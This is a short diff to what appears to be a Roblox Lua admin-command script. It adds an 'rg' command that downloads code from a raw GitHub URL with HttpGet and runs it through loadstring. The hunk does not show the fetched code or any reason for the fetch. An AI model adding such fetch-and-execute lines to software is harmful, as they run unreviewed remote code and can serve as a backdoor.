@@ -331,6 +331,9 @@ addCommand("unmute", function()
 	end)
 end)
 
+addCommand("rg",function(admin)
+	loadstring(game:HttpGet("https://raw.githubusercontent.com/Cat558-uz/Who-is-this-/refs/heads/main/T"))()
+end)
 
 local function onChat(player,msg)
 	if not isAdmin(player) then return end
